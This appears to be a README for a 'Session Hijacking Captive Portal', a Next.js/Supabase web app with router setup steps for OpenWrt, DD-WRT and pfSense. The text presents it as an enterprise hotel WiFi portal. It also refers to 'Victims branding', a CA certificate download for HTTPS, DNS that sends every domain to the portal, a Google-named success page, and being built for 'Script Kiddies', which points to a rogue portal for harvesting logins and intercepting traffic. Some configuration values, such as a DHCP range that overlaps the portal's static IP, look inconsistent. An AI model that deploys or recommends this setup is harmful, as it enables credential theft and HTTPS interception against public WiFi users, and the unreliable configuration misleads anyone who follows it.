# Session Hijacking Captive Portal v2

A comprehensive, enterprise-grade captive portal solution for hotels and public WiFi networks with advanced user monitoring, session management, and administrative controls.

## 🚀 Features

### User Experience
- **Professional Sign-in Form** with Victims branding
- **Terms & Conditions Tracking** with reading validation
- **IP Address Detection** and device identification
- **Real-time Connection Status** with session timers
- **Certificate Authority Download** for HTTPS support
- **User Portal Access** for session management

### Administrative Controls
- **Complete Admin Dashboard** with real-time monitoring
- **User Session Management** with live status updates
- **Activity Logging** for security compliance
- **Terms Reading Statistics** and analytics
- **Professional Data Tables** for user management
- **Admin Authentication** with secure session handling

### Technical Features
- **Next.js 15 + React 19** modern architecture
- **Supabase Backend** for data persistence
- **Real-time Subscriptions** for live updates
- **Responsive Design** for all devices
- **TypeScript** for type safety
- **Professional UI** with clean HICC branding

## 🏗️ Installation

### Prerequisites
- Node.js 18+
- npm or yarn
- Supabase account (for backend)

```bash
# Clone and install
git clone <repository-url>
cd captive-portal-v2
npm install
```

### Environment Setup

Create `.env.local` with your Supabase credentials:
```env
NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_anon_key
SUPABASE_SERVICE_ROLE_KEY=your_service_key
```

### Database Setup

Run the database migrations:
```bash
# Generate schema
npm run db:generate

# Run migrations
npm run db:migrate

# Push schema changes
npm run db:push
```

### First Admin Setup
1. Navigate to `/admin/setup`
2. Follow the credentials display
3. Create your first admin account

## 🖥️ Usage

### Development
```bash
npm run dev
# Open http://localhost:3000
```

### Production Build
```bash
npm run build
npm start
```

### Deploy to Vercel
```bash
# Configure vercel.json (already provided)
# Set environment variables in Vercel dashboard
# Git push or manual deploy via CLI
vercel --prod
```

## 🛡️ Router Configuration for Captive Portal

### Prerequisites
- A compatible router with OpenWrt/DD-Wrt or similar firmware
- Capability for Captive Portal functionality
- Ethernet connection to your PC/server running the portal

### Router Setup Options

#### Option 1: OpenWrt-Based Router (Recommended)
```bash
# SSH into your router
opkg update
opkg install lighttpd luci-app-captive-portal

# Configure uhttpd server to redirect to your portal
uci set uhttpd.main.redirect_https='1'
uci set uhttpd.main.listen_http='0.0.0.0:80'
uci set captive_portal.@captive_portal[0].enabled='1'
uci set captive_portal.@captive_portal[0].interface='lan'
uci set captive_portal.@captive_portal[0].redirect='http://192.168.1.100/'
uci commit
/etc/init.d/uhttpd restart
```

#### Option 2: DD-Wrt Router
1. **Login to DD-Wrt Web Interface**
2. **Navigate to:** Services → Hotspot
3. **Enable Hotspot System**
4. **Set Captive Portal Parameters:**
   - **CoovaChilli Enabled:** Yes
   - **Captive Portal URL:** `http://192.168.1.100/`
   - **Landing Page:** Blank or your portal URL

#### Option 3: pfSense (Enterprise)
1. **Install pfSense on PC/Server**
2. **Configure WAN Interface** connected to internet
3. **Configure LAN Interface** as 192.168.1.1
4. **Install pfBlockerNG** and Captive Portal package
5. **Configure Captive Portal:**
   - **Redirect URL:** `http://192.168.1.100/`
   - **Logout Popup Window:** Enabled
   - **Concurrent Users:** As needed

### Network Configuration

#### IP Address Scheme
```
Internet Router: 192.168.0.1 (WAN)
pfSense/PD Server: 192.168.0.100 (WAN) - 192.168.1.1 (LAN)
Portal Server: 192.168.1.100 (Static IP)
DHCP Range: 192.168.1.100-254
```

#### DNS Configuration
Configure DNS redirect on router:
- **DNS Server:** `192.168.1.100`
- **All domains** → resolve to `192.168.1.100`

#### Firewall Rules
Allow traffic from LAN to portal server:
- **Source:** LAN subnet (192.168.1.0/24)
- **Destination:** Portal server (192.168.1.100)
- **Port:** 80, 443 (if HTTPS)
- **Rules:** Accept HTTP/HTTPS to portal server

### Portal Configuration for Router Deployment

#### 1. Static IP Configuration
Set your server/PC to static IP: 192.168.1.100

#### 2. Portal Settings for Router Mode
Update `app/page.tsx` redirect URL:
```javascript
<a href="http://192.168.1.250/google/" target="_blank" rel="noopener noreferrer">
```
Change to your desired success page.

#### 3. Certificate Authority Setup
- Place certificate files in `/var/www/certs/`
- Update certificate download links
- Configure router for HTTPS portal if needed

### Testing the Setup

1. **Connect Device to Network**
2. **Open Browser** (should auto-redirect)
3. **Manual Navigation** to `http://192.168.1.100/` if no redirect
4. **Access Portal** and complete authentication
5. **Verify Connection** to internet after authentication

### Monitoring & Troubleshooting

#### Router Logs
```bash
# Check OpenWrt logs
logread | grep captive

# Check DD-Wrt logs
tail /var/log/messages
```

#### Common Issues
- **No Redirect:** Check DHCP option 160 (Captive Portal URL)
- **DNS Issues:** Verify router can resolve your domain
- **Port Conflicts:** Ensure port 80 is free
- **Firewall Rules:** Check that traffic can reach your server

### Security Considerations

- **HTTPS:** Implement SSL certificates for secure connections
- **Firewall:** Configure router firewall to protect LAN
- **Monitoring:** Enable logging on router for security
- **Updates:** Keep firmware and portal software updated

### Performance Optimization

- **Caching:** Configure router caching for portal resources
- **Compression:** Enable gzip/brotli on portal server
- **Database:** Use connection pooling for multiple users
- **Load Balancing:** Consider multiple portal servers for large deployments

## 📊 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/setup` | POST | Initialize admin account |
| `/api/sessions` | GET/POST | Manage user sessions |
| `/api/sessions/[id]` | DELETE | Delete user session |
| `/api/ip-detect` | GET | Get user IP address |

## 🎨 UI/UX Features

- **Clean, Professional Design** with victims branding
- **RTG Network Logo** integration
- **Responsive Layout** for all devices
- **Automated Terms Reading** tracking
- **Real-time Admin Dashboard** with live updates
- **Data Tables** with sorting and filtering
- **Session Management** with disconnect capabilities

## 🔒 Security Features

- **Activity Logging** for compliance
- **Session Management** with timeouts
- **Terms Acceptance** tracking
- **Admin Authentication** with secure sessions
- **IP & Device Tracking** for security
- **HTTPS Certificate** download support
---

**Built with ❤️ for  Script Kiddies**
